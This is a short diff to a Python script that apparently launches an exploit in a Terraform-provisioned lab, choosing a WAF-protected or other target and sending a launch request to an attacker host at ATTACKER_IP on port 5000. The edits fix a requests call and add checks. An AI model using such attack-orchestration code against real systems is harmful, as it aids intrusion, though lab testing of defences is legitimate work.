@@ -23,6 +23,7 @@ def main(attack_vector: str) -> None:
 
     print('Attempting to launch expliot...\n')
     outputs = get_terraform_outputs()
+    print(outputs)
     if attack_vector == 'native':
         print('Using native waf protected attack vector...\n')
         target = outputs['NATIVE-DNS']['value']
@@ -32,6 +33,9 @@ def main(attack_vector: str) -> None:
     else:
         print('malformed outputs!')
         target = '127.0.0.1'
+    if 'ATTACKER_IP' not in outputs:
+        print('No attacker ip found in tf outputs!')
+        sys.exit(1)
 
     attacker = outputs['ATTACKER_IP']['value']
     payload = dict()
@@ -42,7 +46,7 @@ def main(attack_vector: str) -> None:
     headers['Content-Type'] = 'application/json'
     headers['Accepts-Type'] = '*/*'
 
-    resp = requests.POST(f'http://{attacker}:5000/launch', data=payload)
+    resp = requests.post(f'http://{attacker}:5000/launch', data=payload)
     if resp.status_code == 200:
         print('Exploit Successfully Launched!\n')
         sys.exit(0)
